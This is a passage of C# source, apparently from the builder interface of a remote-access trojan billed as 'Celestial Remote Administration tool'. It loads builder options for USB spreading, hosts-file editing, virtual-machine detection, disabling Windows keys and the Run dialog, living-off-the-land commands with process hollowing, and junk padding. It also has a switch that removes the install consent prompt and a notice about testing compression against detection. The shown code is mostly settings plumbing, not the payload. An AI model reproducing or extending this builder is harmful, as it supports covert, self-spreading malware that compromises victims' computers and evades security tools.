                if (SettingsC.readSetting("nadmin") != "null") Setting.needadmin = Convert.ToBoolean(SettingsC.readSetting("nadmin"));
                if (SettingsC.readSetting("USBSpread") != "null") Setting.USBSpread = SettingsC.readSetting("USBSpread");
                if (SettingsC.readSetting("USBSpreadn") != "null") Setting.USBSpreadn = SettingsC.readSetting("USBSpreadn");
                if (SettingsC.readSetting("CBlack") != "null") Setting.CBlack = SettingsC.readSetting("CBlack");
                if (SettingsC.readSetting("CBlacklist") != "null") Setting.CBlacklist = SettingsC.readSetting("CBlacklist");
                if (SettingsC.readSetting("needweb") != "null") Setting.needweb = SettingsC.readSetting("needweb");
                if (SettingsC.readSetting("weburl") != "null") Setting.weburl = SettingsC.readSetting("weburl");
                if (SettingsC.readSetting("chromekill") != "null") Setting.chromekill = SettingsC.readSetting("chromekill");
                if (SettingsC.readSetting("HostsEdit") != "null") Setting.HostsEdit = SettingsC.readSetting("HostsEdit");
                if (SettingsC.readSetting("DetectVirtual") != "null") Setting.DetectVirtualEnviroment = SettingsC.readSetting("DetectVirtual");
                if (SettingsC.readSetting("LibFolder") != "null") Setting.LibFolder = SettingsC.readSetting("LibFolder");
                if (SettingsC.readSetting("LibSubFolder") != "null") Setting.LibSubFolder = SettingsC.readSetting("LibSubFolder");
                if (SettingsC.readSetting("DisableRun") != "null") Setting.DisableRun = SettingsC.readSetting("DisableRun");
                if (SettingsC.readSetting("DisableWinKeys") != "null") Setting.DisableWinKeys = SettingsC.readSetting("DisableWinKeys");
                if (SettingsC.readSetting("isServer") != "null") Setting.needserver = SettingsC.readSetting("isServer");
                if (SettingsC.readSetting("password") != "null") Setting.DecryptionPassword = SettingsC.readSetting("password");
                if (SettingsC.readSetting("isLotl") != "null") Setting.isLotl = SettingsC.readSetting("isLotl");
                if (SettingsC.readSetting("LotlCMD") != "null") Setting.LotlCMD = SettingsC.readSetting("LotlCMD");
                if (SettingsC.readSetting("Lotlfilename") != "null") Setting.Lotlfilename = SettingsC.readSetting("Lotlfilename");
                if (SettingsC.readSetting("LotlHollowedProcess") != "null") Setting.LotlHollowedProcess = SettingsC.readSetting("LotlHollowedProcess");

                string[] towrite;

                if (SettingsC.readSetting("HostsList") != "null")
                {
                    Hostslist.hostslist.Clear();
                    towrite = SettingsC.readSetting("HostsList").Split(';');
                    foreach (string s in towrite)
                    {
                        if (s != null && s.Length > 0)
                        {
                            string[] splitted = s.Split('|');
                            Hostslist.Host host = new Hostslist.Host();
                            host.IP = splitted[0];
                            host.Domain = splitted[1];
                            Hostslist.hostslist.Add(host);
                        }
                    }
                }

                notificationManager.Show(new NotificationContent
                {
                    Title = "Settings",
                    Message = "Settings loaded successfully",
                    Type = NotificationType.Success
                });
            }
            catch (Exception ex)
            {
                notificationManager.Show(new NotificationContent
                {
                    Title = "Settings",
                    Message = "Error while loading settings! " + ex.Message,
                    Type = NotificationType.Error
                });
            }
        }

        private void metroCheckBox2_Checked(object sender, RoutedEventArgs e)
        {
            if (System.Windows.Forms.MessageBox.Show("By disabling the installer you agree and acknowledge that you have legal consent to install/run Celestial Remote Administration tool on any computer systems.", "Disable install prompt", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
            {
                metroCheckBox2.IsChecked = false;
                Setting.askInstall = "true";
            }
            else
            {
                Setting.askInstall = "false";
            }
        }

        private void metroCheckBox2_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.askInstall = "true";
        }


        private void metroCheckBox5_Checked(object sender, RoutedEventArgs e)
        {
            var notificationManager = new NotificationManager();
            notificationManager.Show(new NotificationContent
            {
                Title = "Compression",
                Message = "You enabled the compression. It is recommended to test its functionality/detection both with and without using it before proceeding.",
                Type = NotificationType.Warning
            });
        }

        private void junkmodifier_PreviewTextInput(object sender, System.Windows.Input.TextCompositionEventArgs e)
        {
            Regex regex = new Regex("[^0-9]+");
            e.Handled = regex.IsMatch(e.Text);
        }
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            var notificationManager = new NotificationManager();
            notificationManager.Show(new NotificationContent
            {
                Title = "Scripts Manager",
                Message = "On the forum, scripts are not verified by anyone, even popular users can embed malicious code in a script in the next update, so any use is solely at your own risk.",
                Type = NotificationType.Warning
            });
            ScriptManager sm = new ScriptManager(this);
            sm.Show();
        }
    }
}
